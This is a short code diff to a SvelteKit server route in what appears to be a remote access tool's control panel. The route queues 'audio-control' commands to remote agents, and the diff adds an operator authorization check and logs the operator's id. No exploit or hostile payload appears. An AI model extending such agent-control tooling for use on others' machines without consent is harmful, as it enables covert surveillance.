@@ -2,6 +2,7 @@ import { json, error } from '@sveltejs/kit';
 import type { RequestHandler } from './$types';
 import { audioBridgeManager } from '$lib/server/rat/audio';
 import { registry, RegistryError } from '$lib/server/rat/store';
+import { requireOperator } from '$lib/server/authorization';
 import type { AudioControlCommandPayload } from '$lib/types/audio';
 
 interface PlaybackRequest {
@@ -44,11 +45,13 @@ function normalize(body: Record<string, unknown>): PlaybackRequest {
 	return request;
 }
 
-export const POST: RequestHandler = async ({ params, request }) => {
+export const POST: RequestHandler = async ({ params, request, locals }) => {
 	const id = params.id;
 	if (!id) {
 		throw error(400, 'Missing agent identifier');
 	}
+
+	const user = requireOperator(locals.user);
 
 	let payload: Record<string, unknown> = {};
 	try {
@@ -110,7 +113,7 @@ export const POST: RequestHandler = async ({ params, request }) => {
 	}
 
 	try {
-		registry.queueCommand(id, { name: 'audio-control', payload: command });
+		registry.queueCommand(id, { name: 'audio-control', payload: command }, { operatorId: user.id });
 	} catch (err) {
 		if (err instanceof RegistryError) {
 			throw error(err.status, err.message);
